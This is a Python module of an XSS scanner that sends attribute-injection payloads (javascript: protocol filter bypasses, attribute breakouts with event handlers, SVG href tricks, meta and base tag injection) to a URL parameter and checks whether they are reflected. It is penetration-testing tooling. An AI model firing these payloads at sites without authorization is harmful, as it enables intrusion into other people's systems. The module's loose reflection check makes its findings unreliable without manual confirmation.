"""Attribute injection XSS — href, javascript: protocol, attribute breakout, SVG href."""

from __future__ import annotations

import re
from dataclasses import dataclass

import httpx


# javascript: pseudo-protocol in href / src / action
JAVASCRIPT_PROTOCOL_PAYLOADS = [
    "javascript:alert(document.domain)",
    "javascript://%0aalert(document.domain)",       # URL comment bypass
    "javascript://comment%0aalert(document.domain)",
    "j&#97;v&#97;script:alert(1)",                 # entity in href
    "&#106;avascript:alert(1)",                    # decimal entity for j
    "java\tscript:alert(1)",                        # tab stripping
    "java\nscript:alert(1)",                        # newline stripping
    "java\rscript:alert(1)",                        # CR stripping
    "JaVaScRiPt:alert(1)",                         # case variation
    "javascript\x00:alert(1)",                     # null byte
]

# Attribute breakout — escape out of an attribute value
ATTRIBUTE_BREAKOUT_PAYLOADS = [
    '" onmouseover=alert(1) "',
    "' onmouseover=alert(1) '",
    '" autofocus onfocus=alert(1) "',
    "` onmouseover=alert(1) `",            # backtick as attr delimiter (IE)
    "\" style=\"animation-name:x\" onanimationstart=\"alert(1)\"",
    "\" tabindex=1 onfocus=alert(1) x=\"",
    "\" onpointerdown=alert(1) x=\"",
]

# SVG href injection (xlink:href and href in SVG elements)
SVG_HREF_PAYLOADS = [
    '<svg><a href="javascript:alert(1)"><text y=20>click</text></a></svg>',
    '<svg><a xlink:href="javascript:alert(1)"><text y=20>click</text></a></svg>',
    '<svg><use href="data:image/svg+xml,<svg xmlns=\'http://www.w3.org/2000/svg\'><script>alert(1)</script></svg>#x"/>',
    '<svg><animate attributeName=href values="javascript:alert(1)" begin=0s dur=1s fill=freeze>',
    '<svg><set attributeName=href to="javascript:alert(1)">',
]

# Meta refresh / base tag injection
META_PAYLOADS = [
    '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
    '<base href="javascript:alert(1)//">',
]

ALL_ATTRIBUTE_PAYLOADS = (
    JAVASCRIPT_PROTOCOL_PAYLOADS + ATTRIBUTE_BREAKOUT_PAYLOADS +
    SVG_HREF_PAYLOADS + META_PAYLOADS
)

_HREF_PATTERN = re.compile(r'href=["\']?([^"\'>\s]+)', re.I)
_ATTR_SINK_PATTERN = re.compile(r'<(a|link|base|area|form|button|frame|iframe)[^>]+>', re.I)


@dataclass
class AttributeFinding:
    type: str = "attribute_injection"
    url: str = ""
    param: str = ""
    payload: str = ""
    technique: str = ""
    sink: str = ""
    evidence: str = ""
    severity: str = "P1"


class AttributeInjection:
    """Detects attribute-injection and javascript: protocol sinks."""

    def __init__(self, session: httpx.Client | None = None):
        self.session = session or httpx.Client(timeout=20, follow_redirects=True)

    def scan(self, url: str, param: str) -> list[AttributeFinding]:
        findings: list[AttributeFinding] = []
        groups = [
            ("javascript_protocol", JAVASCRIPT_PROTOCOL_PAYLOADS),
            ("attribute_breakout", ATTRIBUTE_BREAKOUT_PAYLOADS),
            ("svg_href", SVG_HREF_PAYLOADS),
            ("meta_injection", META_PAYLOADS),
        ]
        for technique, payloads in groups:
            for payload in payloads:
                f = self._test(url, param, payload, technique)
                if f:
                    findings.append(f)
        return findings

    def find_href_sinks(self, html: str) -> list[str]:
        """Extract href values that could accept javascript: input."""
        return _HREF_PATTERN.findall(html)

    def is_javascript_href_reflected(self, html: str, payload: str) -> bool:
        hrefs = self.find_href_sinks(html)
        return any("javascript" in h.lower() or payload in h for h in hrefs)

    def _test(self, url: str, param: str, payload: str, technique: str) -> AttributeFinding | None:
        try:
            resp = self.session.get(url, params={param: payload})
        except Exception:
            return None
        body = resp.text
        reflected = (
            payload in body
            or "javascript:" in body.lower()
            or "onerror" in body.lower()
            or "onfocus" in body.lower()
            or "onmouseover" in body.lower()
        )
        if not reflected:
            return None
        sink_match = _ATTR_SINK_PATTERN.search(body)
        sink = sink_match.group(0)[:80] if sink_match else "unknown"
        idx = body.find(payload[:15]) if payload[:15] in body else 0
        evidence = body[max(0, idx - 50): idx + 120].replace("\n", "\\n")
        return AttributeFinding(
            url=url, param=param, payload=payload,
            technique=technique, sink=sink, evidence=evidence,
        )
